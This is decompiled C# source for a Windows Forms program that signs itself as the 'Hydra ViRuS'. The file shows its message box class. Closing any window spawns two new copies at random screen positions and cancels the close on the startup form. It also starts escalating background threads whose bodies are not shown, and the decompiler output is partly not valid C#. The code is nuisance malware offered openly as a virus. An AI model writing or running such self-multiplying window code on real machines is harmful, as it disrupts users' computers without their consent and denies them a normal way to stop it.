using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace Hydra
{
	// Token: 0x02000002 RID: 2
	public partial class MsgBoxForm : Form
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public MsgBoxForm()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002060 File Offset: 0x00000260
		private void MsgBoxForm_Load(object sender, EventArgs e)
		{
			try
			{
				base.Location = new Point(Program.rand.Next(0, Screen.PrimaryScreen.Bounds.Width - base.Width), Program.rand.Next(0, Screen.PrimaryScreen.Bounds.Height - base.Height));
				byte b = Program.TextInsanity();
				if (b > 4)
				{
					b = 4;
				}
				if (b == 0)
				{
					this.lblText.Text = "Cut off a head, two more will take its place.\n[Hydra ViRuS BioCoded by WiPet]";
				}
				if (b == 1)
				{
					for (int i = 0; i < (int)Program.textLength; i++)
					{
						Label expr_80 = this.lblText;
						expr_80.Text += ((char)Program.rand.Next(32, 127)).ToString();
					}
				}
				if (b == 2)
				{
					new Thread(delegate
					{
						MsgBoxForm.<<MsgBoxForm_Load>b__3_0>d <<MsgBoxForm_Load>b__3_0>d;
						<<MsgBoxForm_Load>b__3_0>d.<>4__this = this;
						<<MsgBoxForm_Load>b__3_0>d.<>t__builder = AsyncVoidMethodBuilder.Create();
						<<MsgBoxForm_Load>b__3_0>d.<>1__state = -1;
						AsyncVoidMethodBuilder <>t__builder = <<MsgBoxForm_Load>b__3_0>d.<>t__builder;
						<>t__builder.Start<MsgBoxForm.<<MsgBoxForm_Load>b__3_0>d>(ref <<MsgBoxForm_Load>b__3_0>d);
					}).Start();
				}
				if (b >= 2)
				{
					new Thread(delegate
					{
						MsgBoxForm.<<MsgBoxForm_Load>b__3_1>d <<MsgBoxForm_Load>b__3_1>d;
						<<MsgBoxForm_Load>b__3_1>d.<>4__this = this;
						<<MsgBoxForm_Load>b__3_1>d.<>t__builder = AsyncVoidMethodBuilder.Create();
						<<MsgBoxForm_Load>b__3_1>d.<>1__state = -1;
						AsyncVoidMethodBuilder <>t__builder = <<MsgBoxForm_Load>b__3_1>d.<>t__builder;
						<>t__builder.Start<MsgBoxForm.<<MsgBoxForm_Load>b__3_1>d>(ref <<MsgBoxForm_Load>b__3_1>d);
					}).Start();
				}
				if (b == 3)
				{
					new Thread(delegate
					{
						MsgBoxForm.<<MsgBoxForm_Load>b__3_2>d <<MsgBoxForm_Load>b__3_2>d;
						<<MsgBoxForm_Load>b__3_2>d.<>4__this = this;
						<<MsgBoxForm_Load>b__3_2>d.<>t__builder = AsyncVoidMethodBuilder.Create();
						<<MsgBoxForm_Load>b__3_2>d.<>1__state = -1;
						AsyncVoidMethodBuilder <>t__builder = <<MsgBoxForm_Load>b__3_2>d.<>t__builder;
						<>t__builder.Start<MsgBoxForm.<<MsgBoxForm_Load>b__3_2>d>(ref <<MsgBoxForm_Load>b__3_2>d);
					}).Start();
				}
				if (b == 4)
				{
					new Thread(delegate
					{
						MsgBoxForm.<<MsgBoxForm_Load>b__3_3>d <<MsgBoxForm_Load>b__3_3>d;
						<<MsgBoxForm_Load>b__3_3>d.<>4__this = this;
						<<MsgBoxForm_Load>b__3_3>d.<>t__builder = AsyncVoidMethodBuilder.Create();
						<<MsgBoxForm_Load>b__3_3>d.<>1__state = -1;
						AsyncVoidMethodBuilder <>t__builder = <<MsgBoxForm_Load>b__3_3>d.<>t__builder;
						<>t__builder.Start<MsgBoxForm.<<MsgBoxForm_Load>b__3_3>d>(ref <<MsgBoxForm_Load>b__3_3>d);
					}).Start();
				}
				try
				{
					Program.textLength += 2;
				}
				catch
				{
				}
				base.Opacity = 1.0;
			}
			catch
			{
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x000021E4 File Offset: 0x000003E4
		private void btnOk_Click(object sender, EventArgs e)
		{
			if (!this.IsStartupForm)
			{
				base.Close();
				return;
			}
			this.MsgBoxForm_FormClosing(null, null);
			base.Hide();
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002203 File Offset: 0x00000403
		private void MsgBoxForm_KeyPress(object sender, KeyPressEventArgs e)
		{
			if (e.KeyChar == '\r' && this.btnOk.Enabled)
			{
				this.btnOk_Click(null, null);
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002224 File Offset: 0x00000424
		private void MsgBoxForm_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				new MsgBoxForm().Show();
				new MsgBoxForm().Show();
				if (this.IsStartupForm)
				{
					base.Hide();
					e.Cancel = true;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000001 RID: 1
		public bool IsStartupForm;

		// Token: 0x04000002 RID: 2
		public bool BtnPressed;
	}
}
